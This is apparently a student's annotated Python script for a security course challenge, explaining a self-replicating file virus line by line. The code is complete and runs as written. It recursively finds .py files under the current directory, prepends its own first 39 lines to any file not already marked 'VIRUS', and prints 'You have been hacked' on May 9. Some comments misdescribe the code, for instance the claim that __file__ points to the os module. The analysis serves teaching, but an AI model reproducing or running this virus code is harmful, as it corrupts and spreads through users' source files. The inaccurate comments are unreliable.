# Script: 		    OPS 301 Challenge 14
# Author: 		    Lilian Mburu
# Last Revision: 	June 5th 2023
# Purpose: 		    This script is a malicius script. The challenge 
#                   is to analyze the script written in Python and 
#                   provide an interpreted version of the file with comments.

#!/usr/bin/python3

# direct phython to import these modules
# These modules are required in order for script to execute successfully
import os
import datetime

#  String constant.
SIGNATURE = "VIRUS"

# Locate function accepts 1 argument - a path
# this function is used to:
#   - recussively locate all files in the specified path
#   - if the located file is python file, open and check if it contains
#       key word "VIRUS"
#   - if key word "VIRUS" exists, move on
#   - if key word "VIRUS" does not exist add it to a list of targeted files
#   - return the list of targetd files
def locate(path):
    # initiate and empty list
    files_targeted = []

    # get a list of all files and directories in the given path
    # the path here is the one supplied in the function argument
    # resuts are saved in a variable or type 'list'
    filelist = os.listdir(path)

    # loop through each file name in the list of files
    for fname in filelist:
        # check if the fname value is a directory.
        if os.path.isdir(path+"/"+fname):
            # fname value is a directoy
            # add the result to the end of the earlier defined list
            # since this is a directory, call the locate function again.
            # calling the function will be recussive meaning it will keep 
            # calling itself until it reaches a file.
            files_targeted.extend(locate(path+"/"+fname))
        # if the fname is a file, check the last 3 values of the file name
        #  if the value is equal to '.py', execute the terms of the condition
        elif fname[-3:] == ".py":
            # set a variable infected to false
            infected = False

            # open the file
            # iterate each line
            for line in open(path+"/"+fname):
                #  for each line check if the value "VIRUS" is present in the line
                if SIGNATURE in line:
                    # if "VIRUS" is present, updated infected to 'True"
                    infected = True
                    # exit the for loop
                    break
            #  After for loop is done, if infected is 'False', proceed with condition
            if infected == False:
                # Add this file path to the end of the list of files variable
                files_targeted.append(path+"/"+fname)
    # return the results of each function call.  
    return files_targeted

# infect function requires 1 argument - a list of files targeted
def infect(files_targeted):
    # __file__ is a special variable
    #  in this sistuation, this special varibale is being used to get the path 
    #       of python's  the os module
    # one the os module file is located, open the file
    # save the results to a variable
    virus = open(os.path.abspath(__file__))
    # empty string variable
    virusstring = ""
    # for each value, iterate the virus variable
    # each loop will have an index and line content
    for i,line in enumerate(virus):
        # if the index is >= 0 but less than 39
        if 0 <= i < 39:
            # concat the string variable with the current line
            virusstring += line
    # once the for loop is complete, close the virus file
    virus.close

    # For each value in the list of files targeted
    for fname in files_targeted:
        # open the file
        f = open(fname)
        #  read the file contents
        temp = f.read()
        # close the file
        f.close()
        #  open the file with write priviledge
        f = open(fname,"w")
        # take the virus string and the file contents and write over exisitng content
        f.write(virusstring + temp)
        # close the file
        f.close()

#  detonate function does not take any areguments
def detonate():
    # if the month at the time of execution is May and the day is the 9th
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        #  print this statment.
        print("You have been hacked")

# os.path.abspath("") is used to locate the current directory
# pass the directory path to the locate functions
# execute the locate function
# save the results from the locate function to the variable 'files_targeted'
files_targeted = locate(os.path.abspath(""))

# pass the results of variable 'files_targeted' the the infect function
# the files_targeted contains a list of all files located that meets certain condtions
#   as defined in the locate() function
# execute the infect function
# this function will alter the original files with unwanted piece of malicous info
infect(files_targeted)

# execute the detonate function
# once all all the above steps have occured, run this last
detonate()